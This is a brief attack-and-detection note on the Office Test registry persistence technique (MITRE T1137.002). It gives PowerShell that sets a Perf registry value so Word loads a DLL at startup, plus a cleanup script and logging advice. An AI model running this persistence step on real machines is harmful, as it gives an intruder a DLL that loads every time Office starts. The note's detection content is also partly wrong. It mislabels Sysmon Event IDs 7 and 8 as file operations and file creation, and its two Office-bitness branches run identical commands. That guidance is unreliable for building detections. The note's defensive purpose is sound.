

Office Test [T1137.002](https://attack.mitre.org/techniques/T1137/002/)


```powershell
$wdApp = New-Object -COMObject "Word.Application"
if(-not $wdApp.path.contains("Program Files (x86)"))  
{
  Write-Host "64-bit Office"
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "C:\Users\Public\officetest.dll" /f       
}
else{
  Write-Host "32-bit Office"
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "C:\Users\Public\officetest.dll" /f
}
Stop-Process -Name "WinWord" 
Start-Process "WinWord"
```

clean

```powershell
Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore
```

There exist user and global Registry keys for the Office Test feature, such as:

- `HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf`

Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.

Windows Event Viewer:

- Event ID 4688 (Windows Server 2008 and later): A new process has been created, which could indicate the launch of an Office application or a related process.
    
- Event IDs specific to Office applications: Monitor for events related to Office applications such as Word, Excel, or Outlook.
    

Sysmon:

- Event ID 1 - Process creation: Monitor for the creation of processes related to Office applications, such as winword.exe, excel.exe, or outlook.exe.
    
- Event ID 7 - File system operations: Monitor for file creations, modifications, or deletions related to Office applications, such as Office-related files (.docx, .xlsx, .pptx) or suspicious files that could be associated with Office exploitation.
    
- Event ID 8 - File creation: Monitor for the creation of files related to Office applications or suspicious files executed from Office applications.